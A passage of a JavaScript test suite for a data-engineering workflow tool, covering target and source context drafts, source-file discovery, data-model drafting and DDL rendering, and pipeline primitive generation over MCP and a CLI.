      nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: databricks\n    role: target\n    workspaceUrl: adb-1.azuredatabricks.net\n    httpPath: /sql/1.0/warehouses/w\n    catalog: gold\n    credentials: { resolver: cli, ref: prod }\n');
      const [conn] = C.targetConnectionChoices(ws);
      assert.deepStrictEqual([conn.platform, conn.database], ['databricks', 'gold']);
      assert.ok(/is databricks, not snowflake/.test(C.targetChoiceErrors(ws, { connectionId: conn.id, platform: 'snowflake', modelingApproach: 'dimensional', transformationTool: 'dbt', orchestrationTool: 'airflow', namingConvention: 'snake_case' }).join(' ')));
      // Defaults: a team fact in the ledger wins over the last approved target context; the specification's words win over both.
      const facts = [{ kind: 'naming_convention', predicate: 'naming_convention', value: { convention: 'PascalCase' }, statement: 'We use PascalCase', status: 'active' }, { kind: 'decision', predicate: 'orchestration_tool', value: 'dagster', statement: 'Dagster runs our pipelines', status: 'active' }, { kind: 'decision', predicate: 'orchestration_tool', value: 'prefect', statement: 'one problem', status: 'active', specId: 'bps-x' }];
      const d = C.targetDefaults({ assertions: facts, workspaceRoot: ws, problemId: id });
      assert.deepStrictEqual([d.values.namingConvention, d.values.orchestrationTool], ['PascalCase', 'dagster'], 'project-wide facts only');
      const Q = fresh('../dist/core/targetContextQuestions.js');
      const D = fresh('../dist/engine/documents/problemDocuments.js');
      const spec = D.parseBusinessProblemSpec(D.readProblemDocument(prob, 'spec'));
      const qs = Q.buildTargetContextQuestions({ ...spec, problemStatement: 'Daily revenue on Databricks with dbt' }, { connections: [conn], defaults: d });
      const q = (k) => qs.find((x) => x.id === k);
      assert.deepStrictEqual([q('connectionId').suggestedDefault, q('connectionId').options.includes('none yet'), q('namingConvention').suggestedDefault, q('orchestrationTool').suggestedDefault, q('transformationTool').suggestedDefault, q('database').suggestedDefault], [conn.id, true, 'PascalCase', 'dagster', 'dbt', 'gold']);
      assert.ok(!qs.some((x) => x.id === 'environmentProfile'), 'no environment profile: the connection\'s estate environment and the approval policy decide');
      // The draft: the connection decides the platform and the default database; revising an approved one bumps the version and archives it.
      let t = C.writeTargetContextDraft(ws, prob, { connectionId: conn.id, modelingApproach: 'dimensional', transformationTool: 'dbt', orchestrationTool: 'dagster', namingConvention: 'PascalCase', schema: 'revenue' });
      assert.deepStrictEqual([t.platform, t.connectionId, t.platformConfig, t.status, t.version], ['databricks', conn.id, { database: 'gold', schema: 'revenue' }, 'built', 1]);
      nodeFs.writeFileSync(C.targetContextFile(prob), nodeFs.readFileSync(C.targetContextFile(prob), 'utf8').replace('status: built', 'status: approved'));
      t = C.writeTargetContextDraft(ws, prob, { connectionId: conn.id, modelingApproach: 'data-vault', transformationTool: 'dbt', orchestrationTool: 'dagster', namingConvention: 'PascalCase' });
      assert.strictEqual(t.version, 2);
      assert.ok(nodeFs.existsSync(nodePath.join(prob, 'context', 'history', 'target-context.spec1.v1.yaml')));
      // Source: estate systems only; a system not in the estate is refused; stored counts are not written.
      assert.deepStrictEqual(C.sourceSystemChoices(ws), []);
      assert.throws(() => S.writeSourceContextDraft(prob, [{ system: 'shop', connectionId: 'shop.sql', method: 'file' }], {}, new Date(), ws), /not a source system in the estate/);
      assert.strictEqual((await cli(['estate', 'ingest', nodePath.join(ws, 'shop.sql'), '--system', 'shop', ...W])).code, 0);
      const [sys] = C.sourceSystemChoices(ws);
      assert.deepStrictEqual([sys.id, sys.bindings], ['shop', ['shop.sql']]);
      const entry = C.sourceEntryForSystem(ws, 'shop');
      assert.deepStrictEqual([entry.system, entry.method, entry.connectionId], ['shop', 'file', 'shop.sql']);
      const sc = S.writeSourceContextDraft(prob, [{ ...entry, fileSummary: { fileName: 'shop.sql', format: 'ddl', tableCount: 1, columnCount: 4 } }, { connectionId: 'described', method: 'described', description: 'Partner feed, pushed nightly' }], {}, new Date(), ws);
      assert.deepStrictEqual([sc.sources.map((e) => e.system), 'fileSummary' in sc.sources[0]], [['shop', undefined], false]);
      // MCP: the choices, then a draft.
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      const choices = await call('autode_record_target_context', {});
      assert.deepStrictEqual([choices.connections.map((c) => c.id), choices.sourceSystems.map((s) => s.id), choices.options.namingConvention.length], [[conn.id], ['shop'], 3]);
      const bad = await call('autode_record_target_context', { connectionId: conn.id, platform: 'snowflake', modelingApproach: 'dimensional', transformationTool: 'dbt', orchestrationTool: 'airflow', namingConvention: 'snake_case' });
      assert.strictEqual(bad.code, 'VALIDATION_FAILED');
      const ok = await call('autode_record_target_context', { connectionId: conn.id, modelingApproach: 'obt', transformationTool: 'dbt', orchestrationTool: 'airflow', namingConvention: 'snake_case' });
      assert.deepStrictEqual([ok.platform, ok.status], ['databricks', 'built'], JSON.stringify(ok));
      const src = await call('autode_record_source_context', { sources: [{ system: 'nope', connectionId: 'x', method: 'file' }] });
      assert.ok(src.code === 'VALIDATION_FAILED' && /not a source system/.test(src.message), JSON.stringify(src));
      // CLI.
      const show = await cli(['context', 'show', ...W, '--json']);
      assert.strictEqual(show.code, 0, show.err);
      assert.deepStrictEqual([show.json().target.modelingApproach, show.json().sourceSystems[0].id], ['obt', 'shop']);
      const tgt = await cli(['context', 'target', '--connection', conn.id, '--set', 'modelingApproach=dimensional', '--set', 'transformationTool=dbt', '--set', 'orchestrationTool=airflow', '--set', 'namingConvention=snake_case', '--schema', 'mart', ...W]);
      assert.strictEqual(tgt.code, 0, tgt.err);
      assert.strictEqual((await cli(['context', 'target', '--set', 'colour=blue', ...W])).code, 2);
      const srcs = await cli(['context', 'sources', '--system', 'shop', ...W]);
      assert.strictEqual(srcs.code, 0, srcs.err);
      assert.strictEqual((await cli(['context', 'sources', '--system', 'nope', ...W])).code, 5);
      // Run agent's context gaps come from the engine's real context-pack tool (v0.45.9 named it wrongly).
      const { EngineClient } = fresh('../dist/core/engineClient.js');
      const engine = new EngineClient({ workspaceRoot: ws, resourcesRoot: wfRes(), version: 't', log: () => {}, clientName: 't' });
      try {
        const names = (await engine.listTools()).map((x) => x.name);
        assert.ok(names.includes('autode_get_context_pack'));
        const raw = await (await engine.toolSetNamed(['autode_get_context_pack'])).call('autode_get_context_pack', { purpose: 'step', query: 'shop orders' });
        assert.ok(!raw.isError && Array.isArray(JSON.parse(raw.text).manifest.gaps), raw.text.slice(0, 300));
        const gaps = await fresh('../dist/core/agentExecutor.js').stageGaps(engine, prob, 'mapping', 'Mapping');
        assert.ok(Array.isArray(gaps));
      } finally { await engine.dispose(); }
      // The dead workspace file and its manager are gone.
      assert.ok(!nodeFs.existsSync(nodePath.join(__dirname, '..', 'src', 'context', 'TargetConfigManager.ts')));
      assert.ok(!('targetEnvironment' in fresh('../dist/engine/workspaceLayout.js').LAYOUT));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.10: the owner\'s sample — a re-opened document stage stays open until a new draft (its old approval is the version being redone); a workflow that maps sources can\'t approve a source context with none; per-source tasks follow the estate; the target is needed only when the workflow has a target stage', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-reopen-'));
    try {
      const { id, prob, W } = await sourceFlow(ws, cli);
      const R = fresh('../dist/engine/workflows/runtime.js');
      const DA = fresh('../dist/engine/workflows/documentApproval.js');
      const S = fresh('../dist/engine/agents/sourceContextDraft.js');
      const D = fresh('../dist/engine/documents/problemDocuments.js');
      const ctx = { workspaceRoot: ws, problemRoot: prob, problemId: id };
      const st = (x) => R.syncWorkflow(ctx).stages.find((s) => s.id === x);
      const spec = D.parseBusinessProblemSpec(D.readProblemDocument(prob, 'spec'));
      const scFile = nodePath.join(prob, 'context', 'source-context.yaml');
      nodeFs.mkdirSync(nodePath.dirname(scFile), { recursive: true });
      // The sample: a source context approved as not applicable, in a workflow with a mapping stage.
      nodeFs.writeFileSync(scFile, `specId: ${spec.id}\nspecVersion: ${spec.version}\nstatus: not_applicable\nsources: []\nanswers: {}\napprovedAt: 2026-10-15T16:21:58.490Z\nversion: 1\n`);
      assert.strictEqual(R.workflowNeedsSources(fresh('../dist/engine/workflows/instance.js').readWorkflow(prob)), true);
      assert.notStrictEqual(st('sources').status, 'done', 'not applicable is not an approval when the workflow maps sources');
      assert.ok(DA.documentApprovalProblems(prob, 'source-assessment').some((p) => /needs at least one source/.test(p)));
      // Per-source tasks follow the estate until the stage is done (planned with a knowledge-file "system", as in the sample).
      const I = fresh('../dist/engine/workflows/instance.js');
      const planned = I.readWorkflow(prob);
      Object.assign(planned.stages.find((s) => s.id === 'sources'), { repeat: 'per-source-system', systems: ['business-context'], tasks: [{ id: 'sources:business-context', title: 'Source assessment: business-context' }] });
      I.writeWorkflow(prob, planned);
      assert.strictEqual((await cli(['estate', 'ingest', nodePath.join(ws, 'shop.sql'), '--system', 'shop', ...W])).code, 0);
      R.syncWorkflow(ctx);
      const wf = () => fresh('../dist/engine/workflows/instance.js').readWorkflow(prob).stages.find((s) => s.id === 'sources');
      assert.deepStrictEqual([wf().systems, wf().tasks.map((t) => t.id)], [['shop'], ['sources:shop']]);
      // A real source context, approved; then re-opened: it stays open (it used to be approved again within the same second).
      S.writeSourceContextDraft(prob, [{ system: 'shop', connectionId: 'shop.sql', method: 'file' }], {}, new Date(), ws);
      assert.strictEqual(st('sources').status, 'awaiting-approval');
      assert.strictEqual((await cli(['workflow', 'approve', 'sources', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      assert.strictEqual(st('sources').status, 'done');
      await new Promise((r) => setTimeout(r, 5));
      R.reopenStage(ctx, 'sources', { kind: 'person', name: 'priya' }, 'no source tables', 'panel');
      assert.strictEqual(st('sources').status, 'in-progress', 'the earlier approval is the version being redone');
      assert.strictEqual(st('sources').status, 'in-progress', 'and stays so on the next sync');
      S.writeSourceContextDraft(prob, [{ system: 'shop', connectionId: 'shop.sql', method: 'file' }], {}, new Date(), ws);
      assert.strictEqual(st('sources').status, 'awaiting-approval');
      assert.strictEqual((await cli(['workflow', 'approve', 'sources', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      assert.strictEqual(st('sources').status, 'done');
      // Mapping with no tables, after an approved source stage: what to do, not "run the source assessor".
      const graph = nodePath.join(ws, '.autode', 'local', 'derived', 'graph.json');
      nodeFs.mkdirSync(nodePath.dirname(graph), { recursive: true });
      nodeFs.writeFileSync(graph, JSON.stringify({ nodes: [], edges: [] }));
      const ready = fresh('../dist/engine/workflows/readiness.js').stageReadiness({ workspaceRoot: ws, problemRoot: prob, kind: 'mapping' });
      assert.ok(ready.some((p) => /approved without any source tables: re-open it/.test(p)), ready.join(' | '));
      // The panel: no Generate Plan; the target is needed only with a target stage (this template has none).
      const html = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'media', 'sidebar.html'), 'utf8');
      assert.ok(!/Generate Plan/.test(html) && /targetApplicable !== false/.test(html));
      const wv = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'webviewProvider.ts'), 'utf8');
      assert.ok(/targetIncluded: included\('target-context'\)/.test(wv) && /const targetReady = !targetApplicable \|\|/.test(wv));
    } finally { nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.45.10 (owner\'s test): source files shared in the workspace are found deterministically — DDL with its schemas and suggested system, data files, load scripts — and brought into the estate; the source assessor starts with them; the same over MCP and the CLI', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-files-'));
    let client;
    try {
      const put = (rel, text) => { const f = nodePath.join(ws, ...rel.split('/')); nodeFs.mkdirSync(nodePath.dirname(f), { recursive: true }); nodeFs.writeFileSync(f, text); };
      put('sources/crm.ddl', 'CREATE TABLE crm.customers (cust_no VARCHAR(20) PRIMARY KEY, email VARCHAR(255));\nCREATE TABLE crm.tickets (ticket_id INT, cust_no VARCHAR(20));\n');
      put('sources/mixed.sql', 'CREATE OR REPLACE TRANSIENT TABLE IF NOT EXISTS a.t1 (x INT);\nCREATE TABLE b.t2 (y INT);\n');
      put('loads/load_orders.sql', 'COPY INTO raw.orders FROM @stage/orders/;\n');
      put('loads/ingest.py', 'import pandas as pd\ndf = pd.read_csv("orders.csv")\n');
      put('extracts/Orders Export.csv', 'order_id,amount\n1,10\n');
      put('notes/readme.sql', '-- nothing here\nSELECT 1;\n');
      put('package.json', '{}');
      put('node_modules/x/schema.sql', 'CREATE TABLE z.t (a INT);');
      put('autode-output/p/sql/stg.sql', 'CREATE TABLE stg.t (a INT);');
      put('.autode/config/x.sql', 'CREATE TABLE q.t (a INT);');
      const { findSourceFiles } = fresh('../dist/engine/context/sourceFiles.js');
      const files = findSourceFiles(ws);
      const by = Object.fromEntries(files.map((f) => [f.path, f]));
      assert.deepStrictEqual(Object.keys(by).sort(), ['extracts/Orders Export.csv', 'loads/ingest.py', 'loads/load_orders.sql', 'sources/crm.ddl', 'sources/mixed.sql']);
      assert.deepStrictEqual([by['sources/crm.ddl'].kind, by['sources/crm.ddl'].tables, by['sources/crm.ddl'].schemas, by['sources/crm.ddl'].suggestedSystem], ['ddl', 2, ['crm'], 'crm']);
      assert.deepStrictEqual([by['sources/mixed.sql'].tables, by['sources/mixed.sql'].suggestedSystem], [2, 'mixed'], 'two schemas: the file names the system');
      assert.deepStrictEqual([by['loads/load_orders.sql'].kind, by['loads/ingest.py'].kind, by['extracts/Orders Export.csv'].kind, by['extracts/Orders Export.csv'].suggestedSystem], ['load-script', 'load-script', 'data', 'orders-export']);
      // Over MCP; then ingested, it says so.
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      let found = await call('autode_find_source_files', {});
      assert.ok(found.files.length === 5 && /Ingest each DDL/.test(found.next), JSON.stringify(found));
      assert.ok(!(await call('autode_ingest_file', { path: 'sources/crm.ddl', system: 'crm' })).code);
      found = await call('autode_find_source_files', {});
      assert.strictEqual(found.files.find((f) => f.path === 'sources/crm.ddl').ingested, 'crm');
      // The CLI.
      const r = await cli(['estate', 'files', '--workspace', ws, '--json']);
      assert.strictEqual(r.code, 0, r.err);
      assert.strictEqual(r.json().files.find((f) => f.path === 'sources/mixed.sql').suggestedSystem, 'mixed');
      // The source assessor starts with the files; the panel offers to bring them in.
      const role = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'agents', 'source-assessor.md'), 'utf8');
      const skill = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'skills', 'autode-de-source-assessment', 'SKILL.md'), 'utf8');
      assert.ok(/tools: \[autode_find_source_files/.test(role) && /Start with `autode_find_source_files`/.test(skill) && /mcp__autode__autode_find_source_files/.test(skill));
      const wv = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'webviewProvider.ts'), 'utf8');
      assert.ok(/case 'ingestSourceFiles'/.test(wv) && /submit: 'ingestSourceFiles'/.test(wv) && !/Source Context: connect, or describe/.test(wv));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ---------- v0.45.3: PA3b step 3 — the data modeler ----------

  const modelFixture = () => {
    const table = (fqn, cols) => ({ fqn, name: fqn.split('.').pop(), columns: new Map(Object.entries(cols)) });
    const tables = [table('shop.orders', { order_id: 'INT', customer_id: 'INT', amount: 'NUMBER(12,2)', ordered_at: 'TIMESTAMP' }), table('shop.customers', { customer_id: 'INT', email: 'VARCHAR', segment: 'VARCHAR' })];
    const byName = new Map(tables.map((t) => [t.name, [t]]));
    const fact = (id, kind, subject, value, status = 'active') => ({ id, kind, subject, predicate: kind, value, statement: id, status, trust: 'confirmed', evidence: [], validFrom: '', createdBy: 'user:t', createdAt: '' });
    return {
      mappings: [
        { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'fct_orders', columns: [{ sourceColumn: 'order_id', targetColumn: 'order_id' }, { sourceColumn: 'customer_id', targetColumn: 'customer_id' }, { sourceColumn: 'amount', targetColumn: 'net_amount' }, { sourceColumn: 'ordered_at', targetColumn: 'ordered_at' }] },
        { id: 'm2', sourceEntityId: 'shop.customers', sourceFqn: 'shop.customers', targetName: 'dim_customer', columns: [{ sourceColumn: 'customer_id', targetColumn: 'customer_id' }, { sourceColumn: 'email', targetColumn: 'email_hash', transformExpression: 'SHA2(email)' }, { sourceColumn: 'segment', targetColumn: 'segment' }] }
      ],
      schemaIndex: { tables, byName },
      nodes: [],
      assertions: [
        fact('g1', 'grain', ['shop.orders'], ['order_id']),
        fact('k1', 'key', ['shop.orders'], ['order_id']),
        fact('k2', 'key', ['shop.customers'], ['customer_id'], 'proposed'),
        fact('r1', 'relationship', ['shop.orders', 'shop.customers'], { from: { entity: 'shop.orders', columns: ['customer_id'] }, to: { entity: 'shop.customers', columns: ['customer_id'] }, cardinality: 'N:1' }),
        fact('x1', 'key', ['shop.customers'], ['email'], 'rejected')
      ]
    };
  };

  await test('v0.45.3: autode_draft_model drafts from the mapping and the facts — kinds, types, grain and keys through the mapping with their provenance, surrogate keys, foreign keys from relationships — and says what is not known', () => {
    const M = fresh('../dist/engine/agents/modelDraft.js');
    const { model, gaps } = M.draftModel({ ...modelFixture(), approach: 'dimensional', naming: 'snake_case' });
    const e = (n) => model.entities.find((x) => x.name === n);
    assert.deepStrictEqual([e('fct_orders').kind, e('dim_customer').kind], ['fact', 'dimension']);
    assert.deepStrictEqual([e('fct_orders').grain, e('fct_orders').primaryKey], [['order_id'], ['order_id']]);
    assert.ok(e('fct_orders').provenance.some((p) => /grain of shop\.orders \(fact g1, confirmed\) through the mapping/.test(p)), e('fct_orders').provenance.join('|'));
    assert.deepStrictEqual([e('dim_customer').primaryKey, e('dim_customer').naturalKey, e('dim_customer').columns[0].name], [['customer_key'], ['customer_id'], 'customer_key'], 'a surrogate key; the proposed key is the natural key (a rejected one is ignored)');
    assert.strictEqual(e('fct_orders').columns.find((c) => c.name === 'net_amount').type, 'NUMBER(12,2)');
    assert.strictEqual(e('dim_customer').columns.find((c) => c.name === 'email_hash').transform, 'SHA2(email)');
    assert.deepStrictEqual(e('fct_orders').foreignKeys.map((f) => [f.columns, f.references, f.referencedColumns]), [[['customer_id'], 'dim_customer', ['customer_id']]]);
    assert.ok(gaps.some((g) => /dim_customer: no grain/.test(g)) && gaps.some((g) => /SCD type/.test(g)), gaps.join('\n'));
    assert.ok(M.draftModel({ ...modelFixture(), mappings: [] }).gaps.some((g) => /draft the mapping first/.test(g)));
  });

  await test('v0.45.3: autode_check_model refuses a model that can\'t be built (no grain or key, a key or foreign key on columns that aren\'t there, a mapped column missing) and renders the DDL, referenced entities first', () => {
    const M = fresh('../dist/engine/agents/modelDraft.js');
    const fx = modelFixture();
    const { model } = M.draftModel({ ...fx, approach: 'dimensional', naming: 'snake_case' });
    let r = M.checkModel(model, { mappings: fx.mappings });
    assert.ok(!r.ok && r.errors.some((x) => /dim_customer: the grain is required/.test(x)), r.errors.join('\n'));
    const dim = model.entities.find((x) => x.name === 'dim_customer');
    dim.grain = ['customer_id']; dim.scd = 2;
    const fct = model.entities.find((x) => x.name === 'fct_orders');
    fct.foreignKeys = [{ columns: ['customer_key'], references: 'dim_customer' }];
    r = M.checkModel(model, { mappings: fx.mappings });
    assert.ok(r.errors.some((x) => /foreign key column customer_key is not a column/.test(x)), r.errors.join('\n'));
    fct.columns.push({ name: 'customer_key', type: 'INTEGER' });
    r = M.checkModel(model, { mappings: fx.mappings });
    assert.deepStrictEqual(r.errors, []);
    assert.ok(r.ok);
    const broken = JSON.parse(JSON.stringify(model));
    broken.entities[0].columns = broken.entities[0].columns.filter((c) => c.name !== 'net_amount');
    broken.entities[0].foreignKeys.push({ columns: ['customer_key'], references: 'dim_nothing' });
    const rb = M.checkModel(broken, { mappings: fx.mappings });
    assert.ok(rb.errors.some((x) => /net_amount is mapped but not in the model/.test(x)) && rb.errors.some((x) => /dim_nothing, which is not in the model/.test(x)), rb.errors.join('\n'));
    const ddl = M.renderModelDdl({ ...model, database: 'DW', schema: 'MART' });
    assert.ok(ddl.indexOf('CREATE TABLE DW.MART.dim_customer') < ddl.indexOf('CREATE TABLE DW.MART.fct_orders'), 'dimensions first');
    assert.ok(/CONSTRAINT pk_dim_customer PRIMARY KEY \(customer_key\)/.test(ddl) && /FOREIGN KEY \(customer_key\) REFERENCES DW\.MART\.dim_customer \(customer_key\)/.test(ddl) && /one row per order_id/.test(ddl) && /\(SCD2\)/.test(ddl), ddl);
  });

  await test('v0.45.3: the data modeler over MCP — its assignment and skill, a draft from the problem\'s mapping and estate, the check and its DDL; dataModelerAgent is gone', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-model-'));
    let client;
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      nodeFs.writeFileSync(nodePath.join(ws, 'shop.sql'), 'CREATE TABLE shop.orders (\n  order_id INT NOT NULL,\n  amount NUMBER(12,2)\n);\n');
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      await call('autode_ingest_file', { path: 'shop.sql', system: 'shop' });
      fresh('../dist/engine/documents/problemDocuments.js').writeMappingUpsert(prob, { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'fct_orders', columns: [{ sourceColumn: 'order_id', targetColumn: 'order_id' }, { sourceColumn: 'amount', targetColumn: 'net_amount' }] });
      const a = fresh('../dist/engine/agents/assignment.js').assignmentFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'model', (await client.listTools()).tools).assignment;
      assert.deepStrictEqual([a.role, a.skills.map((k) => k.id), a.tier], ['data-modeler', ['autode-de-modelling'], 'propose']);
      assert.ok(a.engineTools.includes('autode_draft_model') && a.engineTools.includes('autode_check_model') && a.engineTools.includes('autode_record_artifact'));
      const d = await call('autode_draft_model', {});
      const fct = d.model.entities.find((x) => x.name === 'fct_orders');
      assert.ok(fct && fct.kind === 'fact' && /NUMBER/.test(fct.columns.find((c) => c.name === 'net_amount').type), JSON.stringify(d));
      assert.ok(d.gaps.some((g) => /no grain/.test(g)));
      let c = await call('autode_check_model', { model: d.model });
      assert.ok(!c.ok && c.errors.length && /CREATE TABLE fct_orders/.test(c.ddl), JSON.stringify(c));
      fct.grain = ['order_id']; fct.primaryKey = ['order_id'];
      c = await call('autode_check_model', { model: d.model });
      assert.ok(c.ok, c.errors.join('\n'));
      assert.ok(!nodeFs.existsSync(nodePath.join(__dirname, '..', 'src', 'agents', 'model', 'DataModelerAgent.ts')));
      assert.ok(!/dataModelerAgent/.test(nodeFs.readFileSync(nodePath.join(__dirname, '..', 'src', 'core', 'agentHub.ts'), 'utf8')));
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ---------- v0.45.4: PA3b step 4 — the pipeline engineer ----------

  await test('v0.45.4: autode_primitive_candidates fills primitives from the facts — staging projection, dedup on the key fact by the change column, incremental MERGE — validated, with notes for what no primitive covers; a key on another system\'s table of the same name is not used', () => {
    const C = fresh('../dist/engine/agents/primitiveCandidates.js');
    const table = (fqn, cols) => ({ fqn, name: fqn.split('.').pop(), columns: new Map(Object.entries(cols)) });
    const tables = [table('shop.customers', { customer_id: 'INT', email: 'VARCHAR', updated_at: 'TIMESTAMP' }), table('crm.customers', { cust_no: 'VARCHAR', name: 'VARCHAR' })];
    const schemaIndex = { tables, byName: new Map([['customers', tables]]) };
    const fact = (id, kind, subject, value) => ({ id, kind, subject, predicate: kind, value, statement: id, status: 'active', trust: 'confirmed', evidence: [], validFrom: '', createdBy: 'user:t', createdAt: '' });
    const r = C.primitiveCandidates({ source: 'shop.customers', target: 'dim_customer', columns: [{ source: 'customer_id', target: 'customer_id' }, { source: 'email', target: 'email_hash', transform: 'SHA2(email)' }, { source: 'updated_at', target: 'updated_at' }], schemaIndex, nodes: [], assertions: [fact('k1', 'key', ['shop.customers'], ['customer_id']), fact('k2', 'key', ['crm.customers'], ['cust_no'])] });
    assert.deepStrictEqual(r.entity.transforms.map((t) => [t.kind, t.valid]), [['rename_cast', true], ['dedup', true], ['incremental_load', true]]);
    const [stage, dedup, merge] = r.entity.transforms;
    assert.deepStrictEqual([stage.params.sourceObject, stage.params.targetObject, stage.params.columns.map((c) => c.target)], ['shop.customers', 'stg_shop_customers', ['customer_id', 'updated_at']]);
    assert.deepStrictEqual([dedup.params.partitionByColumns, dedup.params.orderByColumn, dedup.params.sourceObject], [['customer_id'], 'updated_at', 'stg_shop_customers']);
    assert.ok(dedup.reasons.some((x) => /key from fact k1/.test(x)));
    assert.deepStrictEqual([merge.params.targetObject, merge.params.keyColumns, merge.params.updateColumns], ['dim_customer', ['customer_id'], ['email_hash', 'updated_at']]);
    assert.ok(r.notes.some((n) => /email_hash = SHA2\(email\)/.test(n)), 'an expression is reported, not hidden');
    const crm = C.primitiveCandidates({ source: 'crm.customers', schemaIndex, nodes: [], assertions: [fact('k1', 'key', ['shop.customers'], ['customer_id'])] });
    assert.deepStrictEqual([crm.entity.name, crm.entity.transforms.map((t) => t.kind)], ['crm_customers', ['rename_cast']]);
    assert.ok(crm.notes.some((n) => /No key is known for crm\.customers/.test(n)), 'shop.customers\' key is not crm.customers\'');
  });

  await test('v0.45.4: the pipeline engineer over MCP — candidates from the problem\'s mapping, the Pipeline Spec drafted (identity and lineage filled in, every step validated), compiled, recorded with decision backing; approved as the build stage\'s document', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-build-'));
    let client;
    try {
      const { id, prob, W } = await tinyFlow(ws, cli);
      assert.strictEqual((await cli(['workflow', 'approve', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] })).code, 0);
      nodeFs.writeFileSync(nodePath.join(ws, 'shop.sql'), 'CREATE TABLE shop.orders (\n  order_id INT NOT NULL,\n  amount NUMBER(12,2),\n  updated_at TIMESTAMP\n);\n');
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      await call('autode_ingest_file', { path: 'shop.sql', system: 'shop' });
      const proposed = await call('autode_propose_assertion', { assertion: { kind: 'key', subject: ['shop.orders'], predicate: 'primary', value: ['order_id'], statement: 'order_id identifies an order', evidence: [{ type: 'file', ref: 'shop.sql' }] } });
      const keyId = proposed.assertion ? proposed.assertion.id : proposed.id;
      assert.ok(keyId, JSON.stringify(proposed));
      // A person confirms the key (a proposed fact backs nothing).
      assert.strictEqual((await cli(['facts', 'confirm', keyId, ...W, '--by', 'priya'], { interactive: true, answers: ['confirm'] })).code, 0);
      fresh('../dist/engine/documents/problemDocuments.js').writeMappingUpsert(prob, { id: 'm1', sourceEntityId: 'shop.orders', sourceFqn: 'shop.orders', targetName: 'fct_orders', columns: [{ sourceColumn: 'order_id', targetColumn: 'order_id' }, { sourceColumn: 'amount', targetColumn: 'net_amount' }, { sourceColumn: 'updated_at', targetColumn: 'updated_at' }] });
      const a = fresh('../dist/engine/agents/assignment.js').assignmentFor({ workspaceRoot: ws, resourcesRoot: wfRes(), problemId: id }, 'build', (await client.listTools()).tools).assignment;
      assert.deepStrictEqual([a.role, a.skills.map((k) => k.id), a.tier], ['pipeline-engineer', ['autode-de-pipeline-build'], 'workspace-write']);
      for (const t of ['autode_primitive_candidates', 'autode_record_pipeline_spec', 'autode_compile_pipeline_spec', 'autode_explain_sql']) assert.ok(a.engineTools.includes(t), t);
      const c = await call('autode_primitive_candidates', { source: 'shop.orders' });
      assert.deepStrictEqual([c.entity.name, c.entity.transforms.map((t) => t.kind)], ['fct_orders', ['rename_cast', 'dedup', 'incremental_load']], JSON.stringify(c));
      const bad = await call('autode_record_pipeline_spec', { entities: [{ ...c.entity, transforms: [{ kind: 'dedup', params: { sourceObject: 'x' } }] }] });
      assert.ok(bad.code === 'VALIDATION_FAILED' && /step 1 \(dedup\)/.test(bad.message), JSON.stringify(bad));
      const ok = await call('autode_record_pipeline_spec', { entities: [c.entity] });
      assert.deepStrictEqual([ok.status, ok.version, ok.entities], ['draft', 1, 1], JSON.stringify(ok));
      const P = fresh('../dist/engine/documents/problemDocuments.js');
      const spec = P.parsePipelineSpecDocument(P.readProblemDocument(prob, 'pipelineSpec'));
      const bps = P.parseBusinessProblemSpec(P.readProblemDocument(prob, 'spec'));
      assert.deepStrictEqual([spec.derivedFromBpsId, spec.entities[0].transforms[0].reasons], [bps.id, undefined], 'lineage filled in; candidate reasons are not part of the spec');
      const compiled = await call('autode_compile_pipeline_spec', { dialect: 'snowflake' });
      assert.strictEqual(compiled.entities[0].artifacts.length, 3);
      const dedupSql = compiled.entities[0].artifacts[1].content;
      const rec = await call('autode_record_artifact', { stage: 'build', path: 'sql/fct_orders/2_dedup.sql', content: dedupSql, primitives: [{ kind: 'dedup', params: c.entity.transforms[1].params, lineage: 'shop.orders' }] });
      const manifest = JSON.parse(nodeFs.readFileSync(nodePath.join(ws, rec.manifestPath), 'utf8'));
      assert.ok(manifest.decisions.some((d) => d.usedFor === 'dedup.partitionByColumns' && d.backedBy), JSON.stringify(manifest.decisions));
      const st = (await call('autode_workflow_status', {})).stages.find((s) => s.id === 'build');
      assert.strictEqual(st.status, 'awaiting-approval');
      const ap = await cli(['workflow', 'approve', 'build', ...W, '--by', 'priya'], { interactive: true, answers: ['approve'] });
